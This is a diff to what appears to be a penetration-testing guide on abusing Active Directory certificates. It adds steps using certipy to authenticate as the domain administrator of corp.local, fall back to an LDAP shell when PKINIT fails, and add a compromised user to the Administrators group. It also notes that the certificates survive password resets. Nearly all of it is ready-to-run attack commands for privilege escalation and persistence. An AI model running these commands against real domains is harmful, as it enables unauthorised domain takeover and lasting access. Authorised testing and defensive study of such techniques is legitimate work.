@@ -32,7 +32,7 @@
 
 ## Note: If you get the error The NETBIOS connection with the remote host timed out. please rerun the command.
 
-#### 3) Use OpenSSL and convert the certificate, do not enter a password
+#### 3) Use OpenSSL and convert the certificate, do not enter a password (optional)
 
     openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider" -out cert.pfx
 
@@ -42,6 +42,14 @@
 
     certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
 
+#### If you get a PKINIT error, authenticate via LDAP
+
+    certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100 -ldap-shell
+
+
+#### 5) Upon authenticating via LDAP, add one of your compromised users to the administrators group
+
+    # add_user_to_group user Administrators
 
 ## WARNING! These certificates will still be usable even if the user or computer resets their password!
 
